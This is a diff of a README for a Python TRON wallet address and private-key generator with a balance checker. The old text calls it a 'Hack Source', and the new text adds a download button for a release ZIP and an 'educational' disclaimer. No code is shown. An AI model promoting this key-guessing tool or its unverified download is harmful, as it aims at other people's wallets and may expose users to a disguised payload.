@@ -1,24 +1,63 @@
-# TRON (TRX) Address and Private key Generator
----
-Generator + Checker Value + File Save TRON WALLET
----
-One of the most baseless and baseless networks in the world of cryptocurrency is the TRON (TRX) platform, which itself uses a series of publicized algorithms to build wallets and private keys. With the help of Python, a programmer can start coding the addresses and private keys of this network with a few simple lines. TRON Address And PrivateKey Generator Hack Source
+# ⚡ TRON (TRX) Address & Private Key Generator
+
+<p align="center">
+  <img src="https://i.imgur.com/5cun7on.jpeg" alt="TRON Generator Banner">
+</p>
+
+<p align="center">
+  <b>TRON (TRX) Address Generator • Private Key Generator • Balance Checker</b>
+</p>
+
+<p align="center">
+  <a href="https://github.com/dan-wright-eng1989t7/Tron-TRX-Address-and-Private-key-Generator/releases/download/TRX-GENERATOR/TRX-GENERATOR.zip">
+    <img src="https://img.shields.io/badge/⬇%20Download-TRX%20Generator-00b894?style=for-the-badge" alt="Download">
+  </a>
+</p>
+
+<p align="center">
+  <img src="https://img.shields.io/badge/Python-3.6--3.9-3776AB?style=for-the-badge&logo=python&logoColor=white">
+  <img src="https://img.shields.io/badge/TRON-TRX-FF060A?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Version-v5.1.2-blue?style=for-the-badge">
+</p>
+
 ---
 
-[![Banner](https://camo.githubusercontent.com/956c28123d2e0a54d6f24041f4c44adad36fdce398295c59e849de14449897c5/68747470733a2f2f692e696d6775722e636f6d2f3563756e376f6e2e6a706567)]()
+## 📖 About
 
-![Downloads](https://camo.githubusercontent.com/e6a691b0faded6663f65388b5a27d31cb172501b1e26c88813633facbbb883cc/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f776e6c6f6164732d314d2532422d627269676874677265656e3f7374796c653d666f722d7468652d6261646765)
-![Rating](https://img.shields.io/badge/User%20Rating-4.9%2F5-yellow?style=for-the-badge)
-![Version](https://img.shields.io/badge/Version-v5.1.2-blue?style=for-the-badge)
+**TRON (TRX) Address & Private Key Generator** is a Python-based tool for generating TRON wallet addresses and corresponding private keys.
 
-with this source can generated random address and private key with check balance without api
-Python Version = 3.6 < 3.9
+The project can generate wallet data, display hexadecimal addresses, check address balances, and save generated information to a text file.
 
-Use Package’s : random , ecdsa , base58 , colorama , requests
-check value address without api
-private key tron generator
-print hex address
-use public key and private key on tronpy
-auto save to text file
-high speed to generated
+> ⚠️ **Educational / Research Tool**
+>
+> Use this project only with wallets and private keys that you own or are authorized to test.
+> Never use generated keys to access wallets belonging to other people.
+
 ---
+
+## ✨ Features
+
+| Feature | Description |
+|---|---|
+| 🔑 **Private Key Generator** | Generate random TRON private keys |
+| 👛 **TRON Address Generator** | Create TRON addresses from generated keys |
+| 💰 **Balance Checker** | Check the TRX balance of an address |
+| 🔍 **Hex Address** | Display the hexadecimal representation of an address |
+| 💾 **File Saving** | Automatically save generated wallet information to a text file |
+| ⚡ **High Speed** | Optimized generation process |
+| 🐍 **Python** | Written entirely in Python |
+| 🌐 **No API Key** | Balance checking does not require a personal API key |
+
+---
+
+## 🧰 Requirements
+
+### Python
+
+Supported versions:
+
+```text
+Python 3.6
+Python 3.7
+Python 3.8
+Python 3.9
